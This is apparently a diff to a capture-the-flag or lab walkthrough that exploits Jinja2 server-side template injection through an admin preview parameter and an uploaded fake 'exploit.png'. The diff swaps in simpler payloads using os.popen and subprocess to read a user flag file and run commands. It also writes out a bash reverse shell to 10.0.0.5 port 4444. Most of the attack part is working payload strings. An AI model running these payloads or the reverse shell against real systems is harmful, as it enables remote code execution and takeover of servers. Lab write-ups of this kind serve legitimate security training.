@@ -94,11 +94,17 @@ response — a classic single-request SSTI. Confirm with:
 /admin/preview?content={{7*7}}      → prints 49
 ```
 
-Then get code execution directly:
+Then get code execution directly. `os` (and `subprocess`) are available in the
+template context, so the simplest, textbook Jinja2 SSTI payload works — no
+`__globals__` gadget chain needed:
 
 ```
-/admin/preview?content={{ cycler.__init__.__globals__.os.popen('cat /home/analyst/user.txt').read() }}
+/admin/preview?content={{ os.popen('cat /home/analyst/user.txt').read() }}
+/admin/preview?content={{ subprocess.check_output(['id']) }}
 ```
+
+(The classic `{{ cycler.__init__.__globals__.os.popen('id').read() }}` gadget
+still works too — it is real Jinja2 — but you don't need it here.)
 
 **Detecting it with a scanner.** It sits behind the admin login, so point the
 scanner at it *with the session cookie* you got in Step 2 (copy `session=…`
@@ -121,10 +127,11 @@ a template — so upload a "picture" that is actually a Jinja payload. This path
 is multi-step and authenticated, so off-the-shelf scanners won't find it; it's
 the manual/persistent route.
 
-Create a file `exploit.png` containing:
+Create a file `exploit.png` containing the simple payload (`os` is in the
+render context):
 
 ```jinja
-{{ cycler.__init__.__globals__.os.popen('cat /home/analyst/user.txt').read() }}
+{{ os.popen('cat /home/analyst/user.txt').read() }}
 ```
 
 Fill in a title + text, attach `exploit.png`, publish. Then open the post
@@ -134,11 +141,11 @@ command result — the **user flag**.
 Interactive / reverse shell variant:
 
 ```jinja
-{{ cycler.__init__.__globals__.os.popen('id; uname -a').read() }}
+{{ os.popen('id; uname -a').read() }}
 ```
 
 ```jinja
-{{ cycler.__init__.__globals__.os.popen('bash -c "bash -i >& /dev/tcp/10.0.0.5/4444 0>&1"').read() }}
+{{ os.popen('bash -c "bash -i >& /dev/tcp/10.0.0.5/4444 0>&1"').read() }}
 ```
 
 Because the app is meant to run **as `analyst`**, the shell lands as the
